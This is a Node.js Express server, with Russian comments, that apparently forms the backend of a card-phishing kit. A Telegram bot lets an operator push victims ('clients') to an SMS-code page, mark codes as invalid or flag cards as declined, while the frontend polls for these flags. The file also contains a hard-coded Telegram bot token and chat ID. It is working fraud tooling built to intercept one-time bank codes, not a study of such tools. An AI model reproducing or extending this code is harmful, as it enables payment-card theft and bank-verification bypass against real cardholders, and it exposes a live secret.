const express = require('express')
const cors = require('cors')
const https = require('https')
const path = require('path')

const app = express()
const PORT = process.env.PORT || 3001

// Telegram Bot Configuration
const BOT_TOKEN_CARDS = '8406857793:AAGDQnLYrL78nWDrBxi1AS1kWTTVjxdUbpg'
const CHAT_ID_CARDS = '-1003171719602'

// In-memory storage для флагов SMS
const smsFlags = new Map()

// Middleware
app.use(cors())
app.use(express.json())

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    smsFlags: smsFlags.size,
    uptime: process.uptime(),
    port: PORT,
    environment: process.env.NODE_ENV || 'development'
  })
})

// API routes - must be before static file serving
app.get('/api/check-sms/:userId', (req, res) => {
  const { userId } = req.params
  const smsRequested = smsFlags.get(userId) || false
  res.json({ smsRequested })
})

app.post('/api/clear-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.delete(userId)
  res.status(200).json({ message: `SMS flag cleared for user ${userId}` })
})

app.post('/api/set-sms/:userId', (req, res) => {
  const { userId } = req.params
  smsFlags.set(userId, true)
  res.status(200).json({ message: `SMS flag manually set for user ${userId}` })
})

// Telegram webhook endpoint
app.post('/webhook', (req, res) => {
  const update = req.body
  
  if (update.callback_query) {
    handleCallbackQuery(update.callback_query)
      .then(() => {
        console.log('✅ Callback query processed')
      })
      .catch((error) => {
        console.error('❌ Error processing callback query:', error.message)
      })
  }
  
  res.status(200).json({ ok: true })
})

// Serve static files from dist directory
app.use(express.static('dist'))

// Serve frontend for all other routes
app.get('*', (req, res) => {
  const indexPath = path.join(__dirname, 'dist', 'index.html')
  res.sendFile(indexPath)
})

/**
 * Отправка сообщения в Telegram
 */
function sendTelegramMessage(chatId, text) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    })

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN_CARDS}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }

    const req = https.request(options, (res) => {
      res.on('data', () => {})
      res.on('end', () => {
        resolve()
      })
    })

    req.on('error', (error) => {
      reject(error)
    })

    req.write(postData)
    req.end()
  })
}

/**
 * Ответ на callback query
 */
function answerCallbackQuery(callbackQueryId, text) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      callback_query_id: callbackQueryId,
      text: text,
      show_alert: false
    })

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN_CARDS}/answerCallbackQuery`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    }

    const req = https.request(options, (res) => {
      let data = ''
      
      res.on('data', (chunk) => {
        data += chunk
      })
      
      res.on('end', () => {
        if (res.statusCode === 200) {
          resolve()
        } else {
          reject(new Error(`Telegram API error: ${res.statusCode} - ${data}`))
        }
      })
    })

    req.on('error', (error) => {
      reject(error)
    })

    req.write(postData)
    req.end()
  })
}

/**
 * Обработка callback query от кнопок
 */
async function handleCallbackQuery(callbackQuery) {
  const callbackData = callbackQuery.data
  const chatId = callbackQuery.message.chat.id
  
  let userId = null
  let action = null

  if (callbackData.startsWith('request_sms_')) {
    userId = callbackData.replace('request_sms_', '')
    action = 'request_sms'
  } else if (callbackData.startsWith('request_push_')) {
    userId = callbackData.replace('request_push_', '')
    action = 'request_push'
  } else if (callbackData.startsWith('invalid_sms_')) {
    userId = callbackData.replace('invalid_sms_', '')
    action = 'invalid_sms'
  } else if (callbackData.startsWith('card_blocked_')) {
    userId = callbackData.replace('card_blocked_', '')
    action = 'card_blocked'
  }

  if (userId && action) {
    let responseText = ''

    switch (action) {
      case 'request_sms':
        smsFlags.set(userId, true)
        responseText = '📱 SMS запрошен. Клиент будет перенаправлен на SMS страницу.'
        
        await sendTelegramMessage(chatId, `📱 <b>SMS КОД ЗАПРОШЕН</b>\n\n👤 ID клиента: <code>${userId}</code>\n⏰ Ожидаем ввода SMS кода...`)
        break

      case 'request_push':
        responseText = '🔔 PUSH запрошен'
        await sendTelegramMessage(chatId, `🔔 <b>PUSH УВЕДОМЛЕНИЕ ЗАПРОШЕНО</b>\n\n👤 ID клиента: <code>${userId}</code>`)
        break

      case 'invalid_sms':
        responseText = '❌ SMS код отмечен как неверный'
        await sendTelegramMessage(chatId, `❌ <b>НЕВЕРНЫЙ SMS КОД</b>\n\n👤 ID клиента: <code>${userId}</code>`)
        break

      case 'card_blocked':
        responseText = '🚫 Карта помечена как заблокированная'
        await sendTelegramMessage(chatId, `🚫 <b>КАРТА НЕ ЛЕЗЕТ</b>\n\n👤 ID клиента: <code>${userId}</code>`)
        break
    }

    try {
      await answerCallbackQuery(callbackQuery.id, responseText)
    } catch (error) {
      console.error('❌ Error answering callback query:', error.message)
    }
  } else {
    try {
      await answerCallbackQuery(callbackQuery.id, '❌ Ошибка обработки запроса')
    } catch (error) {
      console.error('❌ Error answering error callback:', error.message)
    }
  }
}

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`)
  console.log(`📱 Telegram webhook: /webhook`)
  console.log(`🔍 Health check: /health`)
  console.log(`📊 SMS flags: ${smsFlags.size}`)
})